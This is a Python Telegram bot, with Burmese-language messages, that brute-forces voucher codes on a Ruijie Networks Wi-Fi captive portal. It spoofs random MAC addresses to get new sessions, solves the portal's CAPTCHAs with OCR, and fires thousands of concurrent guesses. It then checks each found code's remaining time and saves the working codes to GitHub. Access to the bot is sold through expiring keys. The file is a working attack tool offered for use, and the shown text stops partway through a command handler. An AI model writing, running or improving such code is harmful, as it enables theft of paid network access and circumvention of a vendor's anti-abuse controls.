import telebot, asyncio, aiohttp, json, base64, random, re, os, string, time, uuid, itertools, traceback
from telebot.async_telebot import AsyncTeleBot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiohttp import web
import cv2
import ddddocr
import numpy as np
from datetime import datetime, timedelta, timezone

# ── Environment variables ─────────────────────────────────────────────────
BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
GITHUB_TOKEN = os.environ.get("GITHUB_TOKEN", "")
ADMIN_ID = str(os.environ.get("ADMIN_ID", ""))
REPO_OWNER = os.environ.get("REPO_OWNER", "")
REPO_NAME = os.environ.get("REPO_NAME", "")

# ── Domain config ─────────────────────────────────────────────────────────
PORTAL_HOST = "portal-mm-as.ruijienetworks.com"
PORTAL_BASE = f"https://{PORTAL_HOST}"

# ── Performance config ────────────────────────────────────────────────────
CONCURRENCY = 2000
BATCH_SIZE = 3000
CAPTCHA_RETRY = 4
REQUEST_RETRY = 2
POOL_SIZE = 200

# ── Global structures ─────────────────────────────────────────────────────
SUCCESS_CODE = asyncio.Queue()
bot = AsyncTeleBot(BOT_TOKEN) if BOT_TOKEN else None

user_data = {}
approve = {}
scan_tasks = {}
success_texts = {}
limited_texts = {}
notify_setting = {}
DEFAULT_NOTIFY = True
last_scan_params = {}
pending_brute = {}
success_messages = {}
limited_messages = {}

session = None
_connector = None
_voucher_sem = None
_session_pool = None
_start_time = time.monotonic()

MODE_DESCRIPTIONS = {
    "1": ("0-9", string.digits),
    "2": ("a-z", string.ascii_lowercase),
    "3": ("A-Z", string.ascii_uppercase),
    "4": ("a-zA-Z", string.ascii_letters),
    "5": ("a-z0-9", string.ascii_lowercase + string.digits),
}

def log_err(tag, e):
    """Safe error logger — never raises."""
    try:
        print(f"[{tag}] {type(e).__name__}: {e}")
    except Exception:
        pass

# ── Safe bot wrappers ─────────────────────────────────────────────────────
async def safe_send(chat_id, text, **kwargs):
    """Never raise on send failure."""
    if bot is None:
        return None
    try:
        return await bot.send_message(chat_id, text, **kwargs)
    except Exception as e:
        log_err("safe_send", e)
        return None

async def safe_edit(chat_id, message_id, text, **kwargs):
    """Never raise on edit failure."""
    if bot is None:
        return None
    try:
        return await bot.edit_message_text(chat_id=chat_id, message_id=message_id, text=text, **kwargs)
    except Exception:
        return None

async def safe_reply(message, text, **kwargs):
    if bot is None:
        return None
    try:
        return await bot.reply_to(message, text, **kwargs)
    except Exception as e:
        log_err("safe_reply", e)
        return None

# ── Web server ────────────────────────────────────────────────────────────
async def handle(request):
    return web.Response(text="Bot is awake and running 24/7!")

async def web_server():
    try:
        app = web.Application()
        app.router.add_get('/', handle)
        runner = web.AppRunner(app)
        await runner.setup()
        port = int(os.environ.get('BOT_PORT', 8099))
        site = web.TCPSite(runner, '0.0.0.0', port)
        await site.start()
    except Exception as e:
        log_err("web_server", e)

# ── GitHub helpers ─────────────────────────────────────────────────────────
async def get_file_content(path):
    """Return (data, sha) or ({}, None) on any failure."""
    if session is None or not REPO_OWNER or not REPO_NAME or not GITHUB_TOKEN:
        return {}, None
    url = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/{path}"
    headers = {"Authorization": f"token {GITHUB_TOKEN}"}
    try:
        async with session.get(url, headers=headers,
                               timeout=aiohttp.ClientTimeout(total=15)) as response:
            if response.status == 200:
                data = await response.json()
                content = base64.b64decode(data.get('content', '')).decode('utf-8')
                try:
                    return json.loads(content), data.get('sha')
                except json.JSONDecodeError:
                    return {}, data.get('sha')
            return {}, None
    except Exception as e:
        log_err("get_file_content", e)
        return {}, None

async def update_file_content(path, content, sha, message):
    if session is None or not REPO_OWNER or not REPO_NAME or not GITHUB_TOKEN:
        return None
    url = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/{path}"
    headers = {
        "Authorization": f"token {GITHUB_TOKEN}",
        "Content-Type": "application/json"
    }
    try:
        encoded = base64.b64encode(json.dumps(content).encode()).decode()
        payload = {"message": message, "content": encoded}
        if sha:
            payload["sha"] = sha
        async with session.put(url, headers=headers, json=payload,
                               timeout=aiohttp.ClientTimeout(total=20)) as response:
            return await response.text()
    except Exception as e:
        log_err("update_file_content", e)
        return None

# ── Helper functions ───────────────────────────────────────────────────────
def _fmt_num(n):
    try:
        n = int(n)
        if n < 10**15:
            return f"{n:,}"
        return f"{n:.3e}"
    except Exception:
        return str(n)

def check_key_expiration(expiration_time):
    try:
        if isinstance(expiration_time, dict):
            expiry = expiration_time.get("expires_at")
            if not expiry:
                return False
            if expiry == "9999-12-31T23:59:59Z":
                return True
            exp_time = datetime.fromisoformat(str(expiry).replace("Z", "+00:00"))
            return datetime.now(timezone.utc) < exp_time
        # Old format "mm-hh-dd-MM-yyyy"
        mm, hh, dd, MM, yyyy = map(int, str(expiration_time).split('-'))
        expiration_dt = datetime(year=yyyy, month=MM, day=dd, hour=hh, minute=mm,
                                 second=0, tzinfo=timezone.utc)
        return datetime.now(timezone.utc) < expiration_dt
    except Exception as e:
        log_err("check_key_expiration", e)
        return False

def generate_expiry(plan):
    try:
        now = datetime.now(timezone.utc)
        if plan == "unlimited":
            return "9999-12-31T23:59:59Z"
        total_seconds = 0
        for val, unit in re.findall(r'(\d+)([dhm])', plan):
            val = int(val)
            if unit == 'd':
                total_seconds += val * 86400
            elif unit == 'h':
                total_seconds += val * 3600
            elif unit == 'm':
                total_seconds += val * 60
        if total_seconds == 0:
            return None
        return (now + timedelta(seconds=total_seconds)).isoformat()
    except Exception as e:
        log_err("generate_expiry", e)
        return None

def plan_to_minutes(s):
    try:
        if not s:
            return 0
        s = str(s).strip().lower()
        if s in ('unlimit', 'unlimited'):
            return float('inf')
        total = 0
        for val, unit in re.findall(r'(\d+)\s*(mo|min|h|d|m)\b', s):
            val = int(val)
            if unit == 'mo':
                total += val * 30 * 24 * 60
            elif unit == 'd':
                total += val * 24 * 60
            elif unit == 'h':
                total += val * 60
            elif unit in ('min', 'm'):
                total += val
        return total
    except Exception:
        return 0

def _parse_seconds(val):
    try:
        secs = int(float(val))
        hours = secs // 3600
        mins = (secs % 3600) // 60
        if hours > 0:
            return f"{hours}h {mins}m"
        elif mins > 0:
            return f"{mins}m"
        return f"{secs}s"
    except Exception:
        return "N/A"

def _parse_minutes(val):
    try:
        total_mins = int(float(val))
        if total_mins <= 0:
            return "0m"
        if total_mins < 60:
            return f"{total_mins}m"
        hours = total_mins // 60
        mins = total_mins % 60
        if hours < 24:
            return f"{hours}h {mins}m" if mins else f"{hours}h"
        days = hours // 24
        rem_hours = hours % 24
        if days < 30:
            return f"{days}d {rem_hours}h" if rem_hours else f"{days}d"
        months = days // 30
        rem_days = days % 30
        return f"{months}mo {rem_days}d" if rem_days else f"{months}mo"
    except Exception:
        return "N/A"

async def get_balance(token):
    if not token or session is None:
        return "N/A"
    url = f"http://{PORTAL_HOST}/api/auth/balance/getBalance/{token}"
    cookies = {
        'sensorsdata2015jssdkcross': '%7B%22distinct_id%22%3A%2219e460ef444507-091ef90c028745-1e462c6e-343089-19e460ef4452ab%22%7D',
    }
    headers = {
        'authority': PORTAL_HOST,
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/json;',
        'referer': f'{PORTAL_BASE}/download/static/maccauth/src/balance.html?sessionId={token}&lang=en_US&authType=15',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }
    for base_url in (url, f"{PORTAL_BASE}/api/macc2/balance/getBalance/{token}"):
        try:
            async with session.get(base_url, headers=headers, cookies=cookies,
                                   timeout=aiohttp.ClientTimeout(total=10)) as resp:
                if resp.status != 200:
                    continue
                raw = await resp.text()
                try:
                    data = json.loads(raw)
                except Exception:
                    continue

                candidates = [data]
                for nested_key in ('result', 'data'):
                    if isinstance(data, dict) and isinstance(data.get(nested_key), dict):
                        candidates.append(data[nested_key])

                for d in candidates:
                    if not isinstance(d, dict):
                        continue
                    for key in ('totalMinutes', 'remainingMinutes', 'remainMinutes',
                                'leftMinutes', 'balance', 'remaining'):
                        val = d.get(key)
                        if val is not None:
                            return _parse_minutes(val)
                    for key in ('remainingSeconds', 'remainTime', 'remainingTime',
                                'leftTime', 'timeLeft', 'remain_time'):
                        val = d.get(key)
                        if val is not None:
                            return _parse_seconds(val)
        except Exception as e:
            log_err("get_balance", e)
            continue
    return "N/A"

# ── Code iterator ─────────────────────────────────────────────────────────
def get_mode_charset(mode):
    if mode not in MODE_DESCRIPTIONS:
        raise ValueError(f"Unsupported mode: {mode}")
    return MODE_DESCRIPTIONS[mode][1]

def get_mode_total(mode, length):
    try:
        return len(get_mode_charset(mode)) ** int(length)
    except Exception:
        return 0

def iter_codes(mode, length):
    chars = get_mode_charset(mode)
    for combo in itertools.product(chars, repeat=int(length)):
        yield "".join(combo)

def format_progress(checked, total=None, speed=0, found=0, target=None):
    lines = [
        "📋 Status: Running",
        f"⚡ Speed: {speed:,.0f}/min",
        f"🔍 Checked: {_fmt_num(checked)}",
        f"💎 Found: {found}",
    ]
    if total:
        try:
            pct = (checked / total * 100)
            pct_str = f"{pct:.3e}" if (0 < pct < 0.0001) else f"{pct:.4f}"
            lines.append(f"📊 Progress: {pct_str}% ({_fmt_num(checked)}/{_fmt_num(total)})")
        except Exception:
            pass
    if target:
        lines.append(f"🎯 Target: {found}/{target}")
    return "\n".join(lines)

# ── OCR ───────────────────────────────────────────────────────────────────
try:
    _ocr = ddddocr.DdddOcr(show_ad=False)
except Exception as e:
    log_err("ddddocr-init", e)
    _ocr = None

def _ocr_sync(image_bytes):
    if _ocr is None or not image_bytes:
        return None
    try:
        nparr = np.frombuffer(image_bytes, np.uint8)
        img = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
        if img is None:
            return None
        gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
        blur = cv2.GaussianBlur(gray, (3, 3), 0)
        _, thresh = cv2.threshold(blur, 0, 255, cv2.THRESH_BINARY + cv2.THRESH_OTSU)
        _, buffer = cv2.imencode('.png', thresh)
        result = _ocr.classification(buffer.tobytes())
        return result.upper() if result else None
    except Exception as e:
        log_err("_ocr_sync", e)
        return None

async def Captcha_Text(image_bytes):
    try:
        return await asyncio.to_thread(_ocr_sync, image_bytes)
    except Exception as e:
        log_err("Captcha_Text", e)
        return None

# ── MAC / session helpers ─────────────────────────────────────────────────
def get_mac():
    first_byte = random.choice([0x02, 0x06, 0x0A, 0x0E])
    mac = [first_byte] + [random.randint(0x00, 0xff) for _ in range(5)]
    return ':'.join(f'{x:02x}' for x in mac)

def replace_mac(url, new_mac):
    try:
        if 'mac=' not in url:
            return url
        return re.sub(r'(?<=mac=)[^&]+', new_mac, url)
    except Exception:
        return url

async def get_session_id(session_obj, session_url, previous_session_id=None):
    try:
        mac = get_mac()
        url = replace_mac(session_url, mac)
        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'accept-language': 'en-US,en;q=0.9',
            'referer': url,
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36',
        }
        async with session_obj.get(url, headers=headers, allow_redirects=True) as req:
            response = str(req.url)
            sid = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", response)
            if sid:
                return sid.group(1)
            # try from body
            try:
                text = await req.text()
                sid = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", text)
                if sid:
                    return sid.group(1)
            except Exception:
                pass
            return previous_session_id
    except Exception as e:
        log_err("get_session_id", e)
        return previous_session_id

async def Captcha_Image(session_obj, session_id):
    headers = {
        'authority': PORTAL_HOST,
        'accept': 'image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.9',
        'referer': f'{PORTAL_BASE}/download/static/maccauth/src/index.html',
        'sec-fetch-dest': 'image',
        'sec-fetch-mode': 'no-cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
    }
    params = {'sessionId': session_id, '_t': str(time.time())}
    try:
        async with session_obj.get(f'{PORTAL_BASE}/api/auth/captcha/image',
                                   params=params, headers=headers) as req:
            return await req.read()
    except Exception as e:
        log_err("Captcha_Image", e)
        return b""

async def Varify_Captcha(session_obj, session_id, text):
    if not text:
        return None
    headers = {
        'authority': PORTAL_HOST,
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/json',
        'origin': PORTAL_BASE,
        'referer': f'{PORTAL_BASE}/download/static/maccauth/src/index.html',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
    }
    json_data = {'sessionId': session_id, 'authCode': text}
    try:
        async with session_obj.post(f'{PORTAL_BASE}/api/auth/captcha/verify',
                                    headers=headers, json=json_data) as req:
            try:
                data = await req.json()
            except Exception:
                return None
            return session_id if isinstance(data, dict) and data.get("success") is True else None
    except Exception as e:
        log_err("Varify_Captcha", e)
        return None

async def check_session_url(session_url):
    if not session_url or session is None:
        return False
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.9',
        'referer': session_url,
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36',
    }
    try:
        async with session.get(session_url, allow_redirects=True, headers=headers,
                               timeout=aiohttp.ClientTimeout(total=15)) as response:
            return "sessionId" in str(response.url)
    except Exception as e:
        log_err("check_session_url", e)
        return False

# ── Session pool ──────────────────────────────────────────────────────────
def _new_session():
    return aiohttp.ClientSession(
        connector=_connector,
        connector_owner=False,
        cookie_jar=aiohttp.CookieJar(),
        timeout=aiohttp.ClientTimeout(total=30)
    )

async def init_session_pool():
    global _session_pool
    try:
        _session_pool = asyncio.Queue()
        for _ in range(POOL_SIZE):
            s = _new_session()
            await _session_pool.put(s)
    except Exception as e:
        log_err("init_session_pool", e)

async def get_pooled_session():
    try:
        if _session_pool is not None:
            try:
                return _session_pool.get_nowait()
            except asyncio.QueueEmpty:
                pass
        return _new_session()
    except Exception as e:
        log_err("get_pooled_session", e)
        return None

async def release_pooled_session(s):
    if s is None:
        return
    try:
        try:
            s.cookie_jar.clear()
        except Exception:
            pass
        if _session_pool is not None and _session_pool.qsize() < POOL_SIZE * 2:
            await _session_pool.put(s)
        else:
            try:
                await s.close()
            except Exception:
                pass
    except Exception as e:
        log_err("release_pooled_session", e)

# ── Core voucher check ─────────────────────────────────────────────────────
async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False,
                        message=None, plan_filters=None):
    if session_url is None:
        return None
    if not recheck:
        try:
            current_task = scan_tasks.get(chat_id)
            if not current_task or current_task.get("scan_id") != scan_id:
                return None
        except Exception:
            return None

    post_url = f"{PORTAL_BASE}/api/auth/voucher/?lang=en_US"
    response = None
    session_id = None

    for attempt in range(REQUEST_RETRY):
        task_session = await get_pooled_session()
        if task_session is None:
            return None
        try:
            session_id = await get_session_id(task_session, session_url)
            if not session_id:
                continue

            auth_code = None
            for _ in range(CAPTCHA_RETRY):
                try:
                    image = await Captcha_Image(task_session, session_id)
                    if not image:
                        continue
                    text = await Captcha_Text(image)
                    if not text:
                        continue
                    if await Varify_Captcha(task_session, session_id, text):
                        auth_code = text
                        break
                except Exception as e:
                    log_err("captcha-loop", e)
                    continue
            if not auth_code:
                continue

            if not recheck:
                try:
                    current_task = scan_tasks.get(chat_id)
                    if (not current_task or
                            current_task.get("scan_id") != scan_id or
                            current_task.get("stop")):
                        return None
                except Exception:
                    pass

            data = {
                "accessCode": code,
                "sessionId": session_id,
                "apiVersion": 1,
                "authCode": auth_code,
            }
            headers = {
                "authority": PORTAL_HOST,
                "accept": "*/*",
                "accept-language": "en-US,en;q=0.9",
                "content-type": "application/json",
                "origin": PORTAL_BASE,
                "referer": f"{PORTAL_BASE}/download/static/maccauth/src/index.html?sessionId={session_id}",
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
                "user-agent": "Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
            }
            try:
                async with task_session.post(post_url, json=data, headers=headers) as req:
                    response = await req.text()
            except Exception as e:
                log_err("voucher-post", e)
                response = None
        except Exception as e:
            log_err("perform_check-inner", e)
        finally:
            await release_pooled_session(task_session)

        if response and 'request limited' in response:
            await asyncio.sleep(random.uniform(0.5, 1.5))
            continue
        break

    if not response:
        return None

    if 'logonUrl' in response:
        if recheck:
            return code

        plan_str = "N/A"
        try:
            res_data = json.loads(response)
            logon_url = ""
            if isinstance(res_data, dict):
                logon_url = res_data.get("result", {}).get("logonUrl", "") or ""
            token_match = re.search(r'token=(.*?)&', logon_url)
            token = token_match.group(1) if token_match else None
            if not token:
                sid_match = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", logon_url)
                token = sid_match.group(1) if sid_match else session_id
            fetched = await get_balance(token)
            if isinstance(fetched, str) and fetched not in ("N/A", "Error"):
                plan_str = fetched
        except Exception as e:
            log_err("plan-fetch", e)

        if plan_filters:
            try:
                code_mins = plan_to_minutes(plan_str)
                if not any(code_mins >= plan_to_minutes(f) for f in plan_filters):
                    return None
            except Exception:
                pass

        if chat_id not in success_texts:
            success_texts[chat_id] = []
        success_texts[chat_id].append({"code": code, "session_id": session_id, "plan": plan_str})

        try:
            await SUCCESS_CODE.put({"chat_id": chat_id, "code": code,
                                    "session_id": session_id, "plan": plan_str})
        except Exception as e:
            log_err("queue-put", e)

        if notify_setting.get(chat_id, DEFAULT_NOTIFY) and message:
            code_line = "\n".join([f"`{item['code']}` – ⏳ {item['plan']}"
                                    for item in success_texts[chat_id]])
            try:
                if chat_id not in success_messages:
                    sent = await safe_send(chat_id, f"✅ Success Codes:\n{code_line}",
                                           parse_mode="Markdown")
                    if sent:
                        success_messages[chat_id] = sent.message_id
                else:
                    await safe_edit(chat_id, success_messages[chat_id],
                                    f"✅ Success Codes:\n{code_line}",
                                    parse_mode="Markdown")
            except Exception as e:
                log_err("success-notify", e)
        return code

    elif 'STA' in response:
        if chat_id not in limited_texts:
            limited_texts[chat_id] = []
        limited_texts[chat_id].append(code)
        if notify_setting.get(chat_id, DEFAULT_NOTIFY) and message:
            limited_line = "\n".join(limited_texts[chat_id])
            try:
                if chat_id not in limited_messages:
                    sent = await safe_send(chat_id, f"⚠️ Limited Codes:\n{limited_line}")
                    if sent:
                        limited_messages[chat_id] = sent.message_id
                else:
                    await safe_edit(chat_id, limited_messages[chat_id],
                                    f"⚠️ Limited Codes:\n{limited_line}")
            except Exception as e:
                log_err("limited-notify", e)
    return None

# ── Brute-force runner ─────────────────────────────────────────────────────
async def run_bruteforce(mode, length, chat_id, session_url, scan_id, target=None,
                        message=None, progress_msg=None, plan_filters=None):
    global _voucher_sem
    try:
        code_iter = iter_codes(mode, length)
    except Exception as e:
        await safe_send(chat_id, f"Mode error: {e}")
        return

    total = get_mode_total(mode, length)
    checked = 0
    found = 0
    last_key_check = time.monotonic()
    scan_start = time.monotonic()

    if _voucher_sem is None:
        _voucher_sem = asyncio.Semaphore(CONCURRENCY)

    progress_message_id = getattr(progress_msg, 'message_id', None) if progress_msg else None

    try:
        while True:
            try:
                current_task = scan_tasks.get(chat_id)
                if not current_task or current_task.get("scan_id") != scan_id:
                    return
                if current_task.get("stop"):
                    last_scan_params[chat_id] = {
                        "mode": mode, "length": length,
                        "target": target, "plan_filters": plan_filters or []
                    }
                    return
            except Exception:
                return

            batch = []
            try:
                for _ in range(BATCH_SIZE):
                    try:
                        batch.append(next(code_iter))
                    except StopIteration:
                        break
            except Exception as e:
                log_err("batch-build", e)
                break
            if not batch:
                break

            if time.monotonic() - last_key_check >= 600:
                try:
                    auth_list, _ = await get_file_content("auth_list.json")
                    if (str(chat_id) not in auth_list or
                            not check_key_expiration(auth_list[str(chat_id)])):
                        approve[chat_id] = False
                        await safe_send(chat_id, "သင်၏ key သက်တမ်း ကုန်ဆုံးသွားပါပြီ။")
                        return
                except Exception as e:
                    log_err("key-check", e)
                last_key_check = time.monotonic()

            async def _check(c):
                try:
                    async with _voucher_sem:
                        return await perform_check(
                            session_url, c, chat_id, scan_id,
                            message=message, plan_filters=plan_filters
                        )
                except Exception as e:
                    log_err("_check", e)
                    return None

            try:
                results = await asyncio.gather(*[_check(c) for c in batch],
                                                return_exceptions=True)
            except Exception as e:
                log_err("gather", e)
                results = []

            for res in results:
                if res:
                    found += 1
                    if target and found >= target:
                        if progress_message_id:
                            await safe_edit(chat_id, progress_message_id, "🎯 Target reached!")
                        else:
                            await safe_send(chat_id, "🎯 Target reached!")
                        try:
                            last_scan_params.pop(chat_id, None)
                        except Exception:
                            pass
                        return

            checked += len(batch)
            elapsed = time.monotonic() - scan_start
            speed = (checked / elapsed * 60) if elapsed > 0 else 0
            text = format_progress(checked, total, speed, found, target)

            if progress_message_id:
                ok = await safe_edit(chat_id, progress_message_id, text)
                if not ok:
                    new_msg = await safe_send(chat_id, text)
                    if new_msg:
                        progress_message_id = new_msg.message_id
            else:
                new_msg = await safe_send(chat_id, text)
                if new_msg:
                    progress_message_id = new_msg.message_id

        finish_text = f"✅ Scan completed.\n🔍 Total: {_fmt_num(checked)}\n💎 Found: {found}"
        if progress_message_id:
            ok = await safe_edit(chat_id, progress_message_id, finish_text)
            if not ok:
                await safe_send(chat_id, finish_text)
        else:
            await safe_send(chat_id, finish_text)
    except asyncio.CancelledError:
        pass
    except Exception as e:
        log_err("run_bruteforce", e)
    finally:
        try:
            scan_tasks.pop(chat_id, None)
        except Exception:
            pass

# ── GitHub update scheduler ────────────────────────────────────────────────
async def github_update_scheduler():
    while True:
        try:
            await asyncio.sleep(80)
            items = []
            while not SUCCESS_CODE.empty():
                try:
                    items.append(SUCCESS_CODE.get_nowait())
                except asyncio.QueueEmpty:
                    break
            if items:
                results, sha = await get_file_content("result.json")
                if not isinstance(results, dict):
                    results = {}
                for item in items:
                    try:
                        chat_id = str(item["chat_id"])
                        code = item["code"]
                        if chat_id not in results:
                            results[chat_id] = []
                        if code not in results[chat_id]:
                            results[chat_id].append(code)
                    except Exception:
                        continue
                await update_file_content("result.json", results, sha, "Periodic Update")
        except asyncio.CancelledError:
            return
        except Exception as e:
            log_err("github_update_scheduler", e)

# ── Bot commands ───────────────────────────────────────────────────────────
@bot.message_handler(commands=['start'])
async def start(message):
    await safe_reply(message,
        "🤖 Voucher Bot စတင်ပါပြီ။\n\n"
        "📖 အသုံးပြုနည်းအတွက် /help ကိုနှိပ်ပါ။"
    )

@bot.message_handler(commands=['help'])
async def help_cmd(message):
    help_text = (
        "📖 **Voucher Bot အသုံးပြုနည်း လမ်းညွှန်**\n\n"
        "**၁။ Setup:**\n"
        "`/setup <url>`\n\n"
        "**၂။ ရှာဖွေခြင်း:**\n"
        "`/brute <mode> <length> [target]`\n"
        "Mode:\n"
        "  1 = ဂဏန်းသီးသန့် (0-9)\n"
        "  2 = အင်္ဂလိပ်စာလုံးအသေး (a-z)\n"
        "  3 = အင်္ဂလိပ်စာလုံးအကြီး (A-Z)\n"
        "  4 = စာလုံးအကြီး+အသေး (a-zA-Z)\n"
        "  5 = စာလုံး+ဂဏန်း (a-z, 0-9)\n"
        "Length: 1 မှ 10 အတွင်း\n"
        "ဥပမာ: `/brute 1 6 5`\n\n"
        "**၃။** `/status` – အခြေအနေကြည့်\n"
        "**၄။** `/stop` – ရပ်တန့်ခြင်း\n"
        "**၅။** `/resume` – ဆက်ရှာဖွေခြင်း\n"
        "**၆။** `/saved` – ရလဒ်ကြည့်ခြင်း\n"
        "**၇။** `/delete_saved` – ရလဒ်ဖျက်ခြင်း\n"
        "**၈။** `/recheck` – Success codes ပြန်စစ်ခြင်း\n"
        "**၉။** `/notify` – Notification ON/OFF"
    )
    await safe_reply(message, help_text, parse_mode="Markdown")

@bot.message_handler(commands=['key'])
async def handle_key(message):
    try:
        key = str(message.chat.id)
        auth_list, _ = await get_file_content("auth_list.json")
        if not isinstance(auth_list, dict):
            auth_list = {}
        if key in auth_list:
            if check_key_expiration(auth_list[key]):
                approve[message.chat.id] = True
                user_data[message.chat.id] = {}
                await safe_reply(message, "✅ Key မှန်ကန်ပါသည်။ /setup ဖြင့် Session URL ထည့်ပါ။")
            else:
                approve[message.chat.id] = False
                await safe_reply(message, "❌ Key Expired ဖြစ်နေပါသည်။")
        else:
            await safe_reply(message, "သင်၏ key ကို registered မလုပ်ရသေးပါ။")
    except Exception as e:
        log_err("handle_key", e)
        await safe_reply(message, "Error: key check failed.")

@bot.message_handler(commands=['setup'])
async def handle_setup(message):
    try:
        args = message.text.split(maxsplit=1)
        if len(args) < 2:
            await safe_reply(message, "အသုံးပြုနည်း:\n`/setup your_session_url`",
                             parse_mode="Markdown")
            return
        url = args[1].strip()
        if not approve.get(message.chat.id, False):
            await safe_reply(message, "/key ဖြင့် အတည်ပြုပြီးမှ အသုံးပြုပါ။")
            return
        await safe_reply(message, "Session URL စစ်ဆေးနေပါသည်...")
        if await check_session_url(url):
            cid = message.chat.id
            user_data[cid] = {'session_url': url}
            success_texts.pop(cid, None)
            limited_texts.pop(cid, None)
            last_scan_params.pop(cid, None)
            pending_brute.pop(cid, None)
            success_messages.pop(cid, None)
            limited_messages.pop(cid, None)
            try:
                results, sha = await get_file_content("result.json")
                if isinstance(results, dict) and str(cid) in results:
                    del results[str(cid)]
                    await update_file_content("result.json", results, sha, f"Clear codes for {cid}")
            except Exception as e:
                log_err("setup-clear", e)
            await safe_reply(message, "✅ Session URL သိမ်းဆည်းပြီးပါပြီ။ /brute ဖြင့် စတင်ပါ။")
        else:
            await safe_reply(message, "Session URL မှားယွင်းနေပါသည်။")
    except Exception as e:
        log_err("handle_setup", e)
        await safe_reply(message, "Error: setup failed.")

@bot.message_handler(commands=['brute'])
async def brute(message):
    try:
        args = message.text.split()
        if len(args) < 3:
            await safe_reply(message,
                "အသုံးပြုနည်း:\n"
                "`/brute <mode> <length> [target]`\n\n"
                "Mode:\n"
                "  1 = 0-9\n  2 = a-z\n  3 = A-Z\n  4 = a-zA-Z\n  5 = a-z0-9\n\n"
                "Length: 1 မှ 10\n"
                "ဥပမာ: `/brute 1 6 5`",
                parse_mode="Markdown"
            )
            return

        mode = args[1]
        if mode not in MODE_DESCRIPTIONS:
            await safe_reply(message, "Mode သည် 1-5 အတွင်း ဖြစ်ရပါမည်။\n/help ကြည့်ပါ။")
            return

        try:
            length = int(args[2])
            if length < 1 or length > 10:
                await safe_reply(message, "Length သည် 1 မှ 10 အတွင်း ဖြစ်ရပါမည်။")
                return
        except Exception:
            await safe_reply(message, "Length သည် ဂဏန်းဖြစ်ရပါမည်။")
            return

        target = None
        if len(args) >= 4:
            try:
                target = int(args[3])
                if target < 1:
                    await safe_reply(message, "Target သည် 1 နှင့်အထက် ဖြစ်ရပါမည်။")
                    return
            except Exception:
                await safe_reply(message, "Target သည် ဂဏန်းဖြစ်ရပါမည်။")
                return

        chat_id = message.chat.id
        if not approve.get(chat_id, False):
            await safe_reply(message, "/key ဖြင့် အတည်ပြုပြီးမှ အသုံးပြုပါ။")
            return
        if chat_id not in user_data or 'session_url' not in user_data.get(chat_id, {}):
            await safe_reply(message, "/setup ဖြင့် Session URL ထည့်ပါ။")
            return

        if chat_id in last_scan_params:
            try:
                markup = InlineKeyboardMarkup()
                markup.add(
                    InlineKeyboardButton("Resume", callback_data="resume_scan"),
                    InlineKeyboardButton("New Scan", callback_data="new_scan")
                )
                pending_brute[chat_id] = {"mode": mode, "length": length,
                                           "target": target, "plan_filters": []}
                prev = last_scan_params[chat_id]
                await safe_reply(message,
                    f"ယခင် scan ရပ်ထားသည် (mode: {prev.get('mode')}, "
                    f"length: {prev.get('length')}, target: {prev.get('target')}).\n"
                    f"ပြန်စမလား၊ အသစ်စမလား?",
                    reply_markup=markup)
            except Exception as e:
                log_err("brute-resume-prompt", e)
            return

        await start_brute_scan(chat_id, mode, length, target, message, plan_filters=[])
    except Exception as e:
        log_err("brute", e)
        await safe_reply(message, "Error: brute command failed.")

async def start_brute_scan(chat_id, mode, length, target, original_message, plan_filters=None):
    try:
        plan_filters = plan_filters or []
        if chat_id not in user_data or 'session_url' not in user_data.get(chat_id, {}):
            await safe_send(chat_id, "/setup ဖြင့် Session URL ထည့်ပါ။")
            return
        mode_desc = MODE_DESCRIPTIONS.get(mode, ("?", ""))[0]
        total = get_mode_total(mode, length)
        info = (f"🚀 Starting scan...\n"
                f"Mode: {mode} ({mode_desc})\n"
                f"Length: {length}\n"
                f"Total: {_fmt_num(total)}")
        if target:
            info += f"\nTarget: {target}"
        progress_msg = await safe_send(chat_id, info)
        scan_id = str(uuid.uuid4())
        task = asyncio.create_task(
            run_bruteforce(
                mode, length, chat_id, user_data[chat_id]['session_url'],
                scan_id, target, message=original_message,
                progress_msg=progress_msg, plan_filters=plan_filters
            )
        )
        scan_tasks[chat_id] = {"task": task, "stop": False, "scan_id": scan_id}
        success_messages.pop(chat_id, None)
        limited_messages.pop(chat_id, None)
    except Exception as e:
        log_err("start_brute_scan", e)
        await safe_send(chat_id, "Error: scan start failed.")

@bot.message_handler(commands=['stop'])
async def stop_scan(message):
    try:
        chat_id = message.chat.id
